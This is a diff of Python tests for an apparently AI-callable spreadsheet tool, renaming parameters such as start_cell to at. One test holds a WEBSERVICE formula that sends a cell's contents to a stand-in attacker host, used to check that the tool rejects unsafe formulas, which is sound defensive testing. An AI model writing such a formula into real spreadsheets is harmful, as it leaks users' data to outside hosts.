@@ -31,7 +31,7 @@ async def test_write_values_formulas_and_dates(call: ToolCall, sample: Path) -> 
         "write_range",
         path="sales.xlsx",
         sheet="Report",
-        start_cell="B2",
+        at="B2",
         rows=[["Total", "=SUM(Data!C2:C5)"], ["When", "2026-01-31"], ["ID", "000123"]],
     )
     assert result == {"sheet": "Report", "range": "B2:C4", "cells_written": 6}
@@ -43,7 +43,7 @@ async def test_write_values_formulas_and_dates(call: ToolCall, sample: Path) -> 
 
 
 async def test_read_modes(call: ToolCall, sample: Path) -> None:
-    await call("write_range", path="sales.xlsx", sheet="Report", start_cell="A1", rows=[["=1+1"]])
+    await call("write_range", path="sales.xlsx", sheet="Report", at="A1", rows=[["=1+1"]])
     formulas = await call("read_range", path="sales.xlsx", sheet="Report", mode="formulas")
     assert formulas["values"] == [["=1+1"]]
     values = await call("read_range", path="sales.xlsx", sheet="Report", mode="values")
@@ -58,7 +58,7 @@ async def test_write_rejects_unsafe_formulas_without_saving(
         "write_range",
         path="sales.xlsx",
         sheet="Report",
-        start_cell="A1",
+        at="A1",
         rows=[["ok"], ['=webservice("https://attacker.example/?d="&Data!A2)']],
     )
     assert "WEBSERVICE is not allowed" in message
@@ -70,7 +70,7 @@ async def test_write_into_merged_cell_is_rejected(call_error: ToolCall, sample: 
     workbook["Report"].merge_cells("A1:B1")
     workbook.save(sample)
     message = await call_error(
-        "write_range", path="sales.xlsx", sheet="Report", start_cell="B1", rows=[["x"]]
+        "write_range", path="sales.xlsx", sheet="Report", at="B1", rows=[["x"]]
     )
     assert "merged" in message
 
@@ -85,15 +85,15 @@ async def test_clear_range(call: ToolCall, sample: Path) -> None:
 
 
 async def test_copy_range_shifts_relative_references(call: ToolCall, sample: Path) -> None:
-    await call("write_range", path="sales.xlsx", sheet="Data", start_cell="E2", rows=[["=C2*D2"]])
-    await call("copy_range", path="sales.xlsx", sheet="Data", range="E2", target_cell="E3")
+    await call("write_range", path="sales.xlsx", sheet="Data", at="E2", rows=[["=C2*D2"]])
+    await call("copy_range", path="sales.xlsx", sheet="Data", range="E2", at="E3")
     await call(
         "copy_range",
         path="sales.xlsx",
         sheet="Data",
         range="A1:B2",
-        target_cell="A1",
-        target_sheet="Report",
+        at="A1",
+        to_sheet="Report",
     )
     workbook = load_workbook(sample)
     assert workbook["Data"]["E3"].value == "=C3*D3"
@@ -113,7 +113,7 @@ async def test_find_cells(call: ToolCall, sample: Path) -> None:
     ("tool", "arguments"),
     [
         ("clear_range", {"range": "A1:XFD1048576"}),
-        ("copy_range", {"range": "A1:XFD1048576", "target_cell": "A1"}),
+        ("copy_range", {"range": "A1:XFD1048576", "at": "A1"}),
         ("format_range", {"range": "A1:XFD1048576", "style": {"bold": True}}),
         ("merge_cells", {"range": "A1:XFD1048576"}),
         ("read_range", {"range": "A1:XFD1"}),
@@ -131,8 +131,8 @@ async def test_huge_ranges_are_rejected_quickly(
 
 
 async def test_read_omits_trailing_empty_cells_and_rows(call: ToolCall, sample: Path) -> None:
-    await call("write_range", path="sales.xlsx", sheet="Report", start_cell="A1", rows=[["a"]])
-    await call("write_range", path="sales.xlsx", sheet="Report", start_cell="C3", rows=[["c"]])
+    await call("write_range", path="sales.xlsx", sheet="Report", at="A1", rows=[["a"]])
+    await call("write_range", path="sales.xlsx", sheet="Report", at="C3", rows=[["c"]])
     data = await call("read_range", path="sales.xlsx", sheet="Report", range="A1:E6")
     assert data == {"range": "A1:E6", "values": [["a"], [], [None, None, "c"]]}
 
@@ -142,7 +142,7 @@ async def test_read_dates_and_formulas_while_streaming(call: ToolCall, sample: P
         "write_range",
         path="sales.xlsx",
         sheet="Report",
-        start_cell="A1",
+        at="A1",
         rows=[["2026-01-31", "2026-01-31T09:30:00", "=A1", True]],
     )
     data = await call("read_range", path="sales.xlsx", sheet="Report", mode="formulas")
